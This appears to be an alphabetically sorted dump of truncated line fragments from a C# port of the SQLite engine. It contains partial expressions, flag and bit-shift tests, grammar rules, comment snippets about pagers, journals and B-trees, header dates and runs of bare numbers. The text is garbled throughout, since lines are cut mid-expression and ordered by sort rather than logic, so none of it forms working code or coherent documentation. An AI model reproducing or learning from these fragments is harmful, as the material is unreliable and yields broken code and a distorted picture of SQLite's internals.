 ( 1 << (int)( i 
 ( 1 << 8 ) )
 ( 1 << iDb ) ) != 0 )
 ( 1 << p1 ) ) != 0 )
 ( 1 << pOp.p1 ) ) != 0 )
 ( 1 << pOp.p2 ) ) != 0 )
 ( 1 << pOp.p5 ) ) != 0 )
 ( 10 << 8 ) )
 ( 11 << 8 ) )
 ( 12 << 8 ) )
 ( 13 << 8 ) )
 ( 14 << 8 ) )
 ( 15 << 8 ) )
 ( 16 << 8 ) )
 ( 17 << 8 ) )
 ( 2 << 8 ) )
 ( 3 << 8 ) )
 ( 4 
 ( 4 << 8 ) )
 ( 5 << 8 ) )
 ( 6 << 8 ) )
 ( 7 << 8 ) )
 ( 8 << 8 ) )
 ( 86400000.0 / ( 24.0 
 ( 86400000.0 / 24.0 ) 
 ( 9 << 8 ) )
 ( A / 4 )
 ( BITVEC_SZELEM - 1 ) ) )
 ( BITVEC_SZELEM - 1 ) ) ) )
 ( BITVEC_SZELEM - 1 ) ) ) ) != 0 ) 
 ( Convert.ToUInt32( ap[vaNEXT - 1] ) > Int32.MaxValue ) ) return (Int32)( Convert.ToUInt32( ap[vaNEXT - 1] ) - System.UInt32.MaxValue - 1 )
 ( EP_Reduced 
 ( JT_INNER 
 ( JT_LEFT 
 ( M 
 ( MEM_Agg 
 ( MEM_Blob 
 ( MEM_Dyn 
 ( MEM_Ephem 
 ( MEM_Int 
 ( MEM_Null 
 ( MEM_Real 
 ( MEM_Static 
 ( MEM_Str 
 ( No string passed) 
 ( SF_Distinct 
 ( SQLITE_FUNC_LIKE 
 ( SQLITE_ROW == rc 
 ( SQLITE_TEMP_STORE == 1 
 ( SQLITE_TEMP_STORE == 2 
 ( TERM_ANDINFO 
 ( TERM_COPIED 
 ( TERM_DYNAMIC 
 ( TERM_VIRTUAL 
 ( TK_ISNULL 
 ( WHERE_BTM_LIMIT 
 ( WHERE_COLUMN_IN 
 ( WHERE_COLUMN_RANGE 
 ( WHERE_ROWID_EQ 
 ( WO_ISNULL 
 ( WO_LE 
 ( Y 
 ( andFlags 
 ( argc == 3 
 ( argv[0].z.Length > 0 ) 
 ( argv[1].z.Length > 0 ) 
 ( bestScore < 6 
 ( buf[1] << 16 ) 
 ( buf[1] << 8 ) 
 ( buf[2] << 8 ) 
 ( buf[3] << 16 ) 
 ( buf[4] << 8 ) 
 ( buf[5] << 16 ) 
 ( buf[6] << 8 ) 
 ( buf[offset 
 ( c 
 ( c != '
 ( c != 0 ) ) 
 ( c = ( fmt[
 ( c = (byte)z[iOffset 
 ( c = fmt[_fmt] ) != 0 
 ( c = zNum[iZnum 
 ( c = z[cnt] ) != 0 
 ( c = z[zIndex] ) >= '0' 
 ( c > 0x1f 
 ( ch = escarg[i] ) != 0 
 ( chngToIN - 1 ) ) == 0 )
 ( count - ( NDELAY - 1 ) )
 ( db != null 
 ( db.flags 
 ( db.pErr != null 
 ( db.pErr = sqlite3ValueNew( db ) ) != null ) )
 ( eAuto == 1 
 ( eDest == SRT_Mem 
 ( enc 
 ( error = GetLastError() ) != NO_ERROR )
 ( error == ERROR_FILE_NOT_FOUND ) ) 
 ( flags 
 ( fout 
 ( h >= 'A' 
 ( h >= 'a' 
 ( h >> 6 ) )
 ( i 
 ( iCol >= 0 
 ( iDb == 0 
 ( iIdx < iDestroyed ) ) 
 ( iOff 
 ( iOffset 
 ( inTrans != 0 
 ( infop.flags 
 ( jointype 
 ( longvalue / 10 ) % 10 == 1 )
 ( mask 
 ( mustBeUnique == false 
 ( n = (int)r ) == r 
 ( nArg == -1 
 ( nBytes == 0 
 ( nCol 
 ( nIdx 
 ( nMn 
 ( nPage < 0 
 ( nSrcPagesize / nDestPagesize )
 ( needQuote 
 ( new_col_mask 
 ( nextC != 0 
 ( op >= TK_EQ 
 ( p.M - 1 ) / 12 : ( p.M - 12 ) / 12
 ( p.errorAction == OE_Fail 
 ( p.explain - 1 ) )
 ( p.flags 
 ( p.flags2 
 ( p.rc == SQLITE_OK 
 ( p.selFlags 
 ( p.xFunc != null 
 ( p1 == SAVEPOINT_ROLLBACK 
 ( pBest.xStep != null 
 ( pC.aRow != -1 ) )
 ( pChunk = pChunk.pNext ) != null 
 ( pColName.flags 
 ( pColl == null 
 ( pColumn != null 
 ( pDb.pBt != null 
 ( pDb.pBt != null ) )
 ( pDef.flags 
 ( pE.op != TK_DOT 
 ( pE.pLeft != null 
 ( pEList = pNC.pEList ) != null 
 ( pExpr.flags 
 ( pFKey = pTab.pFKey ) == null ) return
 ( pFile.locktype == RESERVED_LOCK ) )
 ( pFunc.nArg 
 ( pIdx.nColumn == 1 
 ( pIdx.nColumn > nEq )
 ( pIn3.r < (double)iKey 
 ( pKeyInfo->nField 
 ( pLevel.iLeftJoin == 0 
 ( pLevel.plan.wsFlags 
 ( pList.nExpr == 0 
 ( pMem.flags 
 ( pMem.u.i - 1 ) < ( pMem.u.i 
 ( pOn != null 
 ( pOp.p2 > 0 
 ( pPage.pLruNext != null 
 ( pPager = sqlite3BtreePager( pBt ) ) == null )
 ( pPager.doNotSync 
 ( pPager.exclusiveMode 
 ( pPager.journalMode == PAGER_JOURNALMODE_MEMORY )
 ( pPager.state == PAGER_RESERVED 
 ( pPager.state == PAGER_UNLOCK 
 ( pParse.db.flags 
 ( pPg == null 
 ( pPg.flags 
 ( pPg.nRef != 0 
 ( pRangeEnd.eOperator 
 ( pRangeStart.eOperator 
 ( pRec.flags 
 ( pSrc.nSrc > 1 
 ( pSub1.pPrior != null 
 ( pSynced.flags 
 ( pTab.tabFlags 
 ( pTabItem.jointype 
 ( pTabList.nSrc - 1 ) 
 ( pTabList.nSrc == 0 
 ( pTerm.eOperator 
 ( pTerm.prereqRight 
 ( pTerm.u.pOrInfo.indexable 
 ( pTrigger == null 
 ( pVal.z[0] ) ) )  //1==(1
 ( p[1 
 ( p[1] << 16 ) 
 ( p[2 
 ( p[2] << 8 ) 
 ( pageSize >= 512 
 ( pgno - pgptrmap - 1 ) )
 ( rc != SQLITE_OK /
 ( rc = sqlite3Reprepare( v ) ) == SQLITE_OK )
 ( rc == SQLITE_SCHEMA 
 ( res == 0 
 ( retries > 0 ) )
 ( seen 
 ( sizeof( u32 ) ) )
 ( sqlite3CtypeMap[( (byte)x )] 
 ( sqlite3CtypeMap[(byte)( x )] 
 ( sqlite3Isspace( zDate[zIndex] ) 
 ( sqlite3OsDeviceCharacteristics( pPager.fd ) 
 ( sqlite3VdbeMemNulTerminate( pMem ) != 0 ) )
 ( startEq << 1 ) 
 ( timeF / ntuPerDay )
 ( token != TK_WHEN 
 ( v 
 ( v = sqlite3GetVdbe( pParse ) ) != null )
 ( v.db.errMask ) ) == rc )
 ( wctrlFlags 
 ( x = aPrefix[pre] ) != 0 
 ( x == 1 ) 
 ( xFinal != null 
 ( xFinal == null 
 ( xtype == etSQLESCAPE2 )
 ( zFilename == null ) )
 ( zIdx 
 ( zIdx == zEndHdr 
 ( zIn[iz] 
 ( zIn[zIndex] 
 ( zLeft[a] != 0 
 ( zLeft[a] == zRight[b] 
 ( zTName == null 
 ( zType.Length == 0 
 ( z[i 
 ( z[iOffset 
 ( z[zDx] - '0' )
 ( z[zIndex] == '
 ( z[zIndex] == 'e' 
 (!pSchema 
 (((c
 (((c-0x10000)>>10)
 (((c-0x10000)>>18)
 ((B) = (u32)
 ((P).maskPage 
 ((c
 ((c>>8)
 ((double)2) In case of SQLITE_OMIT_FLOATING_POINT... 
 ((error = GetLastError()) == ERROR_ACCESS_DENIED))
 ((flags 
 ((h1 
 ((pBt.pageSize - 1) 
 (.net2
 (0 == iRoot 
 (0 == leafData 
 (0) input ::= cmdlist 
 (0==(pPg = sqlite3PcacheDirtyList(pPager.pPCache)) 
 (0x3f 
 (1) cmdlist ::= cmdlist ecmd 
 (1) the space required for a copy of the Expr structure only and
 (10) trans_opt ::= 
 (10<<8))
 (11) trans_opt ::= TRANSACTION 
 (11<<8))
 (12) trans_opt ::= TRANSACTION nm 
 (12<<8))
 (13<<8))
 (14<<8))
 (15<<8))
 (16<<8))
 (17<<8))
 (1<<8) )
 (1<<8))
 (2) cmdlist ::= ecmd 
 (2) the EP_xxx flags that indicate what the structure size should be.
 (20) savepoint_opt ::= SAVEPOINT 
 (2006-02-16:)  The enc value can be or-ed with SQLITE_UTF16_ALIGNED.
 (2007-08-30)  Frank van Vugt has studied this problem closely
 (21) savepoint_opt ::= 
 (25) cmd ::= create_table create_table_args 
 (268) plus_opt ::= PLUS 
 (269) plus_opt ::= 
 (279) foreach_clause ::= 
 (280) foreach_clause ::= FOR EACH ROW 
 (287) tridxby ::= 
 (2<<8))
 (3) ecmd ::= SEMI 
 (305) database_kw_opt ::= DATABASE 
 (306) database_kw_opt ::= 
 (314) kwcolumn_opt ::= 
 (315) kwcolumn_opt ::= COLUMNKW 
 (319) vtabarglist ::= vtabarg 
 (320) vtabarglist ::= vtabarglist COMMA vtabarg 
 (322) vtabarg ::= vtabarg vtabargtoken 
 (326) anylist ::= 
 (327) anylist ::= anylist LP anylist RP 
 (328) anylist ::= anylist ANY 
 (34) columnlist ::= columnlist COMMA column 
 (35) columnlist ::= column 
 (3<<8))
 (4) ecmd ::= explain cmdx SEMI 
 (44) type ::= 
 (4<<8))
 (51) signed ::= plus_num 
 (52) signed ::= minus_num 
 (53) carglist ::= carglist carg 
 (54) carglist ::= 
 (55) carg ::= CONSTRAINT nm ccons 
 (56) carg ::= ccons 
 (5<<8))
 (62) ccons ::= NULL onconf 
 (6<<8))
 (7<<8))
 (89) conslist ::= conslist COMMA tcons 
 (8<<8))
 (90) conslist ::= conslist tcons 
 (91) conslist ::= tcons 
 (92) tcons ::= CONSTRAINT nm 
 (9<<8))
 (JOURNAL_HDR_SZ - 28) bytes that will not be used. So that is what
 (JOURNAL_HDR_SZ bytes) is read from the current location in the journal
 (Mem) which are only defined there.
 (Mem.type==SQLITE_TEXT).
 (PCache1.apHash structure) that it is currently stored in.
 (Pgno)nEntry ) / nEntry)
 (READ_LOCK or WRITE_LOCK) on the table with root-page iTab. Return
 (SQLITE_DEBUG)
 (SQLITE_DEBUG) 
 (SQLITE_MAX_EXPR_DEPTH-Parse.nHeight) height. This is a bit
 (SQLITE_MUTEX_NOOP) 
 (SQLITE_OPEN_READWRITE
 (These output registers are allocated by sqlite3Select().)  When
 (WARNING/TODO: If P1 is a pseudo-cursor and P2 is dynamically
 (WO_EQ
 (WO_IN
 (_CRT_INSECURE_DEPRECATE)
 (_MSC_VER)) 
 (_M_IX86))
 (__GNUC__)
 (__i386__) 
 (__x86_64__))
 (a power of two between 512 and 32768) plus a little extra for each
 (aDyn 
 (aDyn==0 
 (aff==SQLITE_AFF_NUMERIC 
 (an arbitrary prime)in the hash function provided
 (and thus suppressing the second one) even if they have different
 (apArg[0].flags
 (approx 10%) by avoiding numerous malloc/free requests while parsing
 (av != 0) != pBt.autoVacuum)
 (b0 is memory location iBMem
 (but pCell
 (c=zNum[i])>='0' 
 (c>0x1f 
 (call it pOther) in the same process was busy using the same shared
 (cast as a void
 (char
 (char)( c 
 (cnt
 (cost<lowestCost) test below will never be true.
 (db)->aVTrans==0)
 (db->nVTrans 
 (double)-1 In case of SQLITE_OMIT_FLOATING_POINT... 
 (double)0 In case of SQLITE_OMIT_FLOATING_POINT... 
 (double)2440587
 (double)43200 ) / (double)86400 
 (eLockType==READ_LOCK 
 (error=GetLastError())!=NO_ERROR )
 (for example during a conversion from UTF-8 to UTF-16) then a
 (frag > (int)data[hdr 
 (h1 = zRight[i])!=0 
 (h2 = zRight[i
 (i = yy_shift_ofst[stateno]) == YY_SHIFT_USE_DFLT)
 (i.e. it is acceptable to provide an implementation that segfaults if
 (i64)10000 ) )
 (i64)nDestPagesize >= iSize 
 (i64)nSrcPgsz
 (i64)pPager.pageSize
 (i==0 
 (iCell))
 (iFallback = yyFallback[iLookAhead]) != 0)
 (iOffset
 (iOfst
 (iSavepoint == -1 
 (idx 
 (if the corresponding pDone bit is set) then skip the playback.
 (int)( sqlite3BitvecSize( pBitvec ) - sz )
 (int)(yymsp[-1].minor.yy0.z.Length - yymsp[0].minor.yy0.z.Length)
 (int)(z2 - z)
 (int)OPFLAG_NCHANGE : 0 ) )
 (int)ap[vaNEXT - 1] == 0 )
 (int)closest 
 (int)i < nRoot 
 (int)id.fs.Length : 0
 (int)p.nVar : 0
 (int)pPager.dbSize : -1
 (int)pVm.nResColumn : 0
 (int)sqlite3UpperToLower[(byte)z[_z
 (int)sqlite3_user_data( context ) != 0
 (int)szHdr > m.n ) )
 (isClearTable 
 (isIndex 
 (just an integer to hold its size) while it is being processed.
 (later):  It is reported to me that the mixed-endian problem
 (made available to the compiler for reuse) using
 (maximum of) 9 bytes data
 (nAlloc-1)
 (nCell = ((nCell 
 (nCol - 1) 
 (nCol-1)
 (nField-1)
 (nMaxCells)]
 (nNew == 1 
 (nPayload - minLocal) % (pPage.pBt.usableSize - 4))
 (nRoot 
 (nSize - minLocal) % (pPage.pBt.usableSize - 4))
 (not a SELECT or EXISTS) and that the RHS might contains NULLs.
 (op == TK_DELETE)
 (op == TK_INSERT)
 (op == TK_UPDATE)
 (or -9223372036854775808) since when you do abs() of that
 (or transaction). No page with a page-number greater than this value
 (p->locked==0 
 (p->pNext==0 
 (p.flags
 (p.inTrans == TRANS_READ 
 (p.inTrans == TRANS_WRITE))
 (p.nSrc-1) : 0)
 (p.nSrc>0 
 (p==pBt.pWriter 
 (p=pcache1.pLruTail) ){
 (pBtree.db.flags 
 (pBuf = db.lookaside.pFree)!=0 ){
 (pCell[info.iOverflow]<=
 (pCur.eState == CURSOR_INVALID 
 (pCur.pKeyInfo == null) == (pRoot.intKey != 0))
 (pLimit == null) ) {
 (pLock.eLock==WRITE_LOCK 
 (pLock.iTable==iTab 
 (pPage.intKey != 0 
 (pPager.pageSize >= pPager.pVfs->mxPathname
 (pParent.pgno == 1 
 (pPg.flags
 (pPg.flags 
 (pSchema.flags
 (pTab->tabFlags 
 (pTab.tabFlags 
 (part of the main SQLite library - not an extension) so that
 (pgno > sqlite3BitvecSize(p) 
 (possibly synchronous) transaction opened on the main database before
 (ppPage).pPager==null )
 (rT - 2440587) - 43200
 (rc!=SQLITE_OK 
 (returning SQLITE_OK immediately).
 (single database transaction).
 (sizeof(
 (slower) variable length keys B-Tree.
 (sqlite3.xUpdateCallback) is invoked following a successful insert.
 (sqlite3_int64)2000000000 
 (sqlite3_int64)294967296
 (sqlite3_int64)43200
 (sqlite3_int64)86400
 (sqlite3_int64)ft.dwLowDateTime
 (sqlite3_step() etc.).
 (stored in BtCursor.aOverflow[]) is allocated and used by function
 (the cache is lazily populated).
 (the first created). A value of (Pager.nSavepoint-1) means operate
 (to 2 or 3) gives a modest improvement in SELECT and DELETE performance
 (u32)i
 (u32)nSrcPage
 (u64)0xffffffff )
 (u8)((c>>12)
 (u8)((c>>12) 
 (u8)((c>>18) 
 (u8)((c>>6)
 (u8)((c>>6) 
 (u8)(c 
 (u8)jumpIfNull )
 (u8)pMem.z[j] : pMem.zBLOB[j]
 (unreduced) Expr objects as they or originally constructed by the parser.
 (usually but not always -1) prior to calling this routine.
 (usually only once during the lifetime of the process). It is passed
 (via sqlite3_step()).
 (when less compiler optimizations like -Os or -O0 are used and the
 (which occurs during hot-journal rollback). Summary:
 (which should be the last to shutdown.) 
 (with [SQLITE_THREADSAFE=0] and with [sqlite3_threadsafe()] returning 0)
 (x = pVtab->pModule->xSync)!=0 ){
 (x)[1])
 (xBegin/xRollback/xCommit and optionally xSync) and a transaction is
 (zType[i
 )      /
 )      //while( 
 ) )
 ) ) 
 ) ) sz = 0
 ) //z[i] != 0
 ) = 
 ) aXRef[i] = -1
 ) buf[--bufpt] = x
 ) buf[idx] = (char)c
 ) cp.aOvfl[i] = aOvfl[i].Copy()
 ) if ( !sqlite3Isdigit( zNum[i] ) ) break
 ) new_ht[i] = new _ht()
 ) p.zBLOB[i] = (u8)p.z[i]
 ) pMem.zBLOB[i] = (byte)z[i]
 ) r.aMem[rI] = p.aMem[pOp.p3 
 ) r.aMem[ra] = p.aMem[pOp.p2 
 ) sb.Append( (char)pRec.zBLOB[i] )
 ) sb.Append( (char)zBlob[izIn 
 ) { argv1[i] = new sqlite3_value()
 ) { c = (byte)z[iOffset 
 ) { if ( zArg[i] == '
 ) { mem0.aPageFree[i] = i
 ) { sb.Append( (char)zBLOB[i] )
 ) { this.aColCache[i] = new yColCache()
 ) { }
 ) { }//IdChar(z[iOffset
 )// p
 )// p=pParse.aColCache... p
 )// pFrom
 )// pItem
 )//<pWCEnd
 )//for (pRec = pData0
 )//p=pParse->aColCache
 )//p=pParse.aColCache... p
 )//pEnd =  p[N] 
 )//pOp
 )//pOrTerm = pOrWC.a 
 )//sizeof(aBucket)/sizeof(aBucket[0])
 )] = '0'
 - 4 bytes: Database page size.
 - 4 bytes: Initial database page count.
 - 4 bytes: Random number used for page hash.
 - 4 bytes: Sector size used by the process that wrote this journal.
 - 8 bytes: Magic identifying journal format.
 -- Replace allocation with individual Dims
 -- string zExtra
 --------------------------------
 ------------------------------------------------------------------------
 -0.5 : 
 -1 : 
 -1 : 1
 -1 : iCol )
 -1 : ii )
 -1 : j )
 -1 if the named db cannot be found.
 -1 returns an integer too large to store in a 64-bit data-type. On
 -1000000 as the incorrect index into db->aDb[] is much
 -1] = z
 -DSQLITE_DEFAULT_LOCKING_MODE=1 makes EXCLUSIVE the default locking
 -DSQLITE_ENABLE_EXPENSIVE_ASSERT=1 compile-time option.
 -Y : Y
 -i : i )
 -v : v
 -v1 : v1 )
 ...
 ... 
 // 
 //       sqlite3ParserARG_FETCH
 //      yymsp[0] = yypParser.yystack[yypParser.yyidx]
 //    sqlite3_free(ref p)
 //    sqlite3_free(ref pBt)
 //  return (pNew 
 // !rc
 // (
 // (Schema
 // -- Not Running under NT
 // = p.aOp[p.nOp - 1].zComment
 // Check on the sCollMap
 // DWORD attr
 // Debug.Assert( pRes != 0 )
 // FILE_ATTRIBUTE_NORMAL
 // FILE_ATTRIBUTE_TEMPORARY
 // FILE_FLAG_RANDOM_ACCESS
 // GENERIC_READ
 // GENERIC_READ 
 // IV 12 bytes
 // Need this since mutex_enter 
 // Negative Offset means overflow cells
 // Not NT
 // Not Used --  sizeof( BtCursor )
 // Our old state.
 // SQLITE_PTR_TO_INT(zP4)
 // TODO -
 // TODO --
 // TODO -- 
 // TODO --    sqlite3GlobalConfig.m.xFree(p)
 // TODO -- func_c
 // Work around string pointer
 // expandBlob(pVal)
 // flags = SQLITE_PTR_TO_INT(sqlite3_user_data(context))
 // if ( piNewColMask != 0 ) piNewColMask 
 // if ( piOldColMask != 0 ) piOldColMask 
 // if (pColl != null) pColl 
 // memcpy( 
 // memset(
 // needs ref
 // pCache.apHash[h] = pp.pNext
 // pIn1[j])
 // pLeft 
 // pMem
 // pOp[-1].opcode == OP_CollSeq )
 // sizeof( MemJournal )
 // sqlite3ParserARG_FETCH
 // sqlite3ParserARG_STORE
 // was unicodeToUtf8(zTemp)
 // yyStackEntry[] yymsp = new yyStackEntry[0]
 //(DbPage
 //(charMap(z[iOffset
 //(sqlite3_context
 //(struct _ht 
 //(void 
 //)(Walker
 //.net2 
 /// Not needed in C
 //AuthTag
 //CHECK_FOR_INTERRUPT
 //Debug.Assert(offset % JOURNAL_HDR_SZ(pPager) == 0)
 //Decode base64
 //ENC( db ) = encoding
 //Encrypted Data
 //Entered Pattern
 //FILE_ATTRIBUTE_READONLY ) == 0
 //GetVarint( aKey1 
 //GlogUpperToLower(c)
 //GlogUpperToLower(c2)
 //Start of Buffer
 //TOKEN.z[0])
 //data[pPage.cellOffset 
 //int (
 //memcpy(
 //memcpy( 
 //memcpy( data[hdr 
 //memcpy( data[idx 
 //memset(
 //memset( 
 //p.aVar = p.aMem[nMem 
 //p.azVar = (char
 //pBuf 
 //pC.aRow = null
 //pCell[0]
 //pCur.info.pCell 
 //pIter 
 //pMem
 //pNew
 //pOp[-1].p4type == P4_COLLSEQ )
 //pStop = 
 //pTabItem = pTabList.a
 //ptr = 
 //sizeof(
 //sqlite3Get4byte( pCell )
 //sqlite3Malloc( nCell )
 //sqlite3Malloc(ref pVfs.szOsFile)
 //sqlite3PageMalloc( pBt.pageSize )
 //sqlite3ParserARG_FETCH
 //sqlite3PendingByte
 //sqlite3VdbeMemNulTerminate(pMem[i])
 //sqlite3_free )
 //sqlite3_free(ref pBt)
 //sqlite3_query_plan[nQPlan
 //sqliteHashData(pElem)
 //u8
 //u8 pIter = 
 //void (
 //while ( ( 
 //while ( ( ( 
 //zBuf.Append( 'e' )
 0   1   2   3   4   5   6   7   8   9   A   B   C   D   E   F 
 0   START: 
 0 != MEMDB
 0 != pPager.memDb
 0 : (int)( attr 
 0 : (int)pCur.info.nKey)
 0 : -1
 0 : 1
 0 : 2 )
 0 : UpperToLower[zLeft[a 
 0 : WO_OR )
 0 : c0 
 0 : c1.n
 0 : c2.n
 0 : info.nKey)) == info.nPayload)
 0 : sqlite3Strlen30( pMem.z )
 0 : vm.pResultSet.Length
 0 == ( iDc 
 0 == ( pList.flags 
 0 == ( pPage.flags 
 0 == ( pPg.flags 
 0 == ( sqlite3OsDeviceCharacteristics( pMaster ) 
 0 == (pPage = pCur.apPage[pCur.iPage]).leaf)
 0 == db.autoCommit ) 
 0 == db.autoCommit ) )
 0 == db.init.busy 
 0 == db.init.busy )
 0 == db.init.busy ) )
 0 == db.mallocFailed 
 0 == desiredAutoCommit )
 0 == iRollback 
 0 == iRollback )
 0 == isCommit )
 0 == isHot 
 0 == isUnsync
 0 == leafData)
 0 == memDb)
 0 == okToChngToIN 
 0 == pNC.allowAgg )
 0 == pPage.intKey)
 0 == pPage.leaf)
 0 == pPager.journalOff )
 0 == pPager.memDb
 0 == pParse.db.mallocFailed 
 0 == pRoot.leaf)
 0 == rc 
 0 == searchList)
 0 == sqlite3BtreeSyncDisabled( pBt ) )
 0 == wrflag))
 0 for min() or 0xffffffff for max() 
 0 if leaf==1.  4 if leaf==0 
 0 if the RowSet is already empty.
 0 is not a legal page number and page 1 cannot be an
 0 is returned if the new WhereTerm could not be added due to a memory
 0 or 1 parent pages.  (In this context 'database page' refers
 0.5
 0.5 )
 00..07    ........ 
 0169
 0414
 0618
 0649</NoWarn>
 08..0f    ........ 
 0:   Operating system unknown.
 0: (!end_constraints) 
 0: Start a transaction 
 0==
 0==(db.flags
 0==(p.pBtree.db.flags 
 0==MEMDB )
 0==pPg.pDirty)
 0] 
 0] )
 0] ) 
 0] ) << 16 ) 
 0] ) << 8 ) 
 0] << 24 ) 
 0] << 8 
 0] = (byte)( v >> 8 )
 0] = data[j - 2]
 0] = data[pc 
 0] = pTrunk.aData[0 
 0]] ) 
 0x 
 0x0000FFFF ) == pExpr.iTable )
 0x01 ) != 0
 0x01 ) != 0 )
 0x010101
 0x04 ) != 0
 0x06 ) != 0
 0x07)
 0x08 ) != 0
 0x0F] )
 0x0f) 
 0x3F)
 0x40000000 results in an incompatible database file format!
 0x7 ) == 0 )
 0x7F )
 0x7FFFFFFF is the hard limit for the number of pages in a database
 0x7f )
 0x7f ) 
 0x7f) << 7) 
 0x7fffffff )
 0x7fffffff ) % sz )
 0x7fffffff)%(SHARED_SIZE - 1))
 0x80 )
 0x80 ) 
 0x80 ) != 0 
 0x80 ) )
 0x80)
 0x80) 
 0x80) != 0 
 0x80)//!(pCell[1] 
 0xC0 ) == 0x80 ) { iz
 0xFF )
 0xFF ) )
 0xFF ) == SQLITE_LOCKED )
 0xFFFFF800 ) == 0xD800
 0xFFFFFFFE ) == 0xFFFE ) { c = 0xFFFD
 0xFFFFFFFF
 0xFFFFFFFF ) )
 0xc0 ) == 0x80 )
 0xc0)==0x80 ){            
 0xc0)==0x80 ){ zIn
 0xf
 0xf)<<4)
 0xf)==0xb ){
 0xf] )
 0xff
 0xff )
 0xff ) == SQLITE_IOERR
 0xff ) == pFunc.nArg )
 0xff ) == rc )
 0xfff
 0xffffff ) == v )
 0xffffffff )
 0xffffffff : 0xff )
 1           /
 1  NORMAL: 
 1 )
 1 ) 
 1 ) != 0 )
 1 ) != 0 ) goto bitvec_end
 1 ) % BITVEC_NINT
 1 ) % BITVEC_NINT )
 1 ) )
 1 ) ) 
 1 ) ) //PAGER_MJ_PGNO(pPager))
 1 ) ) == SQLITE_OK
 1 ) - ( TK_ISNULL 
 1 ) / 10000 )
 1 ) == i )
 1 - leafData
 1 - p.iNext )
 1 - pCell.Length)
 1 - pg1 )
 1 : 0
 1 : 0 )
 1 : 0 ) 
 1 : 0 ) != 0 )
 1 : 0 ) )
 1 : 0 ) ) )
 1 : 0 ) ) ).ToCharArray()
 1 : 0 ) - ( pCache.bPurgeable 
 1 : 0)
 1 : 0) 
 1 : 0))
 1 : 2 )
 1 : i
 1 : nArg]
 1 : nCursor]
 1 : nVar]
 1 < zDate.Length 
 1 == ( 1 
 1 == MEMDB
 1 == pPager.memDb
 1 == top)
 1 > db.aLimit[SQLITE_LIMIT_COLUMN] )
 1 >= pCache.nMax 
 1 chance in 2
 1 for DESC or 0 for ASC 
 1 for ON or NORMAL and 2 for FULL.  Return 1 for an empty or
 1 for writing.  0 for read-only 
 1 if leaf flag is set 
 1 it means that the db pointer is valid and 0 if it should not be
 1 through N generate an error.  ORDER BY terms that are expressions
 1 to honor DESC in index.  0 to ignore. 
 1 to write. 0 read-only 
 1's digit 
 1) 
 1) != parent)
 1) { rc = SQLITE_CORRUPT
 1))
 1)==isTemp )
 1)].pCell.Length 
 1)].pCell.Length)
 1-byte signed integer 
 1-byte unsigned integer 
 1-gibabyte boundary) in a compatible database.  SQLite never uses
 1.  
 1. No cursors may be open in the main database.  (But newIdx and oldIdx
 10 
 10 )
 10 : 0
 10's digit 
 10..17    ........ 
 10.0
 10.0 
 100
 100 
 100 : 0)
 100 : 0))
 100 for page 1.  0 otherwise 
 100's digit 
 1000
 1000 )
 1000 > timeout )
 1000000000.0 )
 101 
 102 
 103 
 104 
 105 
 106 
 107 
 108 
 109 
 110 
 111 
 112 
 113 
 114 
 115 
 116 
 11644473600)
 117 
 118 
 119 
 12 
 12 - 4 
 120 
 121 
 122 
 123 
 123456789 123456 
 123456789 123456789 
 124 
 125 
 126 
 127 
 128 
 129 
 129600000 ) / 86400000 ) % 7
 129600000 ) / 86400000 ) % 7 ) )
 130 
 131 
 132 
 133 
 134 
 135 
 136 
 137 
 138 
 139 
 14 bits - BA
 140 
 141 
 142 
 143 
 144 
 145 
 146 
 147 
 148 
 149 
 150 
 151 
 152 
 1524
 153 
 154 
 155 
 156 
 157 
 158 
 159 
 16 (the number of significant digits in a 64-bit float) '0' is
 16)
 160 
 161 
 162 
 163 
 164 
 165 
 166 
 167 
 168 
 169 
 17 and 18 above) it must be a UNION ALL and the parent query must
 170 
 171 
 172 
 173 
 174 
 175 
 176 
 177 
 178 
 179 
 18..1f    ........ 
 180 
 181 
 182 
 183 
 184 
 185 
 186 
 187 
 188 
 189 
 19-digit numbers must be no larger than 9223372036854775807 if positive
 190 
 1900
 191 
 192 
 193 
 194 
 195 
 196 
 197 
 1970-01-01 00:00:00 is JD 2440587.5
 198 
 199 
 1:   Operating system is Win95.
 1:  The cursor must have been opened with wrFlag==1
 1: (end_constraints 
 1: A variable arguments function that prefers UTF-8 when a UTF-16
 1: Check the schema cookie 
 1: UTF-16.  0: UTF-8 
 1: file 2: memory 0: default 
 1: trimleft  2: trimright  3: trim 
 1:save off p0<<21 
 1GB boundary.
 1] 
 1] != '
 1] != '-' )
 1] != '/' ) { zIdx
 1] != '=' )
 1] != 0 
 1] )
 1] ) )
 1] ) ) )
 1] ) == '=' )
 1] ) > 0 ) nx = 0
 1] << 16 ) 
 1] << 8 ) 
 1] = (byte)( v 
 1] = (byte)v
 1] = 0
 1] = data[j - 1]
 1] = data[pc 
 1] = pNewPage
 1] = pTrunk.aData[0 
 1] == '
 1] == '-' )
 1] == '-' ) 
 1] == ':' )
 1] == '=' 
 1] == 0
 1] == data[hdr 
 1] == delim )
 1] == quote ) )
 1]) <= pPage.maxLocal//pCell[1])<=pPage.maxLocal
 1].CopyTo( argv1[i] )
 1].jointype 
 1].pExpr.op == TK_COLUMN )
 1].pExpr.op == TK_REGISTER )
 1].pUsing ) != null )//pItem[1].pUsing
 1].pgno
 1st argument to callback 
 1st argument to the access auth function 
 1st input operand 
 1x 
 2 )
 2 ) 
 2 ) != 0 )
 2 ) )
 2 / 3
 2 : 0 )
 2 : 1
 2 : 1 )
 2 : 1024 / 4 )
 2 <= szLeft - (szCell[r] 
 2 <= top)
 2 == top)
 2 > pPage.nFree)
 2 > pProbe.aiRowEst[0] )
 2 >= z.Length 
 2 EXPLAIN: 
 2 bytes of the cell.
 2) - pbegin
 2))
 2-byte signed integer 
 2-byte unsigned integer 
 20 )
 20 ) )
 20 or so.  This insures that Robson memory allocation limits are
 200 
 2000-01-01 00:00:00 is JD 2451544.5
 2001 September 15
 2001 September 16
 2001 September 22
 2002 February 23
 2002-Feb-14: This routine is extended to remove MS-Access style
 2003 April 6
 2003 January 11
 2003 October 31
 2003 September 6
 2004 April 13
 2004 April 6
 2004 May 22
 2004 May 26
 2005 February 15
 2005 July 8
 2005 May 23
 2005 May 25
 2005 November 29
 2006 June 10
 2006 June 7
 2007 August 14
 2007 August 22
 2007 August 27
 2007 August 28
 2007 May 1
 2007 May 7
 2007-01-16:  The wireshark project (www.wireshark.org) reports that
 2007-06-25:  There is a bug in some versions of MSVC that cause the
 2008 August 05
 2008 August 16
 2008 August 18
 2008 December 3
 2008 February 16
 2008 Jan 22
 2008 June 13
 2008 June 18
 2008 May 26
 2008 May 27
 2008 November 05
 2008 October 07
 2008 October 28
 2009 January 28
 2009 March 3
 201 
 202 
 203 
 204 
 205 
 206 
 207 
